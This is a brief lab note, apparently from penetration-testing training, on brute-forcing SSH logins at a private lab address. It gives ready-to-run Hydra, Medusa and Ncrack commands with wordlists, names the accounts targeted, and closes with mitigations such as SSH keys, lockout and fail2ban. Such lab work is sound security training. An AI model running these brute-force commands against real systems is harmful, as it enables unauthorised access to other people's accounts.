## Online Password Attacks

---

### 🎯 Objective
Use Hydra, Medusa, and Ncrack to brute-force online login services.

---

### 🧪 Hydra – SSH
```bash
hydra -l sys -P /usr/share/john/password.lst ssh://172.17.0.2
```

---

### 🧪 Medusa – SSH
```bash
medusa -h 172.17.0.2 -u sys -P /usr/share/wordlists/metasploit/unix_users.txt -M ssh
```

---

### 🧪 Ncrack – SSH
```bash
ncrack -p 22 --user sys -P /usr/share/john/password.lst 172.17.0.2
```

---

### 📂 Lab Findings
- Accounts targeted: `sys`, `klog`, `service`, `gordonb`, `user`, `postgres`
- Weak passwords cracked quickly

---

### 🛡 Mitigation
- Disable password auth → use SSH keys
- Lockout after failed attempts
- Use fail2ban or similar

---

### 📌 Take-Aways
- Online brute-force is slow and noisy
- Targeted usernames + good wordlists improve success rate
